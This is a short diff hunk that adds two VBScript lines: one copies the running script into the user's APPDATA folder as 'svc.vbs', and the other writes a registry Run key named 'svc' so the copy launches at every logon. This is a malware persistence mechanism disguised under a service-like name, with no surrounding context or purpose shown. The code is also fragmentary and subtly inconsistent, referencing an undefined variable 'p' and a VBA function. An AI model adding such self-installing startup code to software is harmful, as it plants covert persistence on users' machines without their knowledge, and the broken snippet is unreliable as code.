@@ -1,0 +1,3 @@
+fso.CopyFile WScript.ScriptFullName, Environ("APPDATA") & "\svc.vbs"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svc", "wscript " & p, "REG_SZ"
+
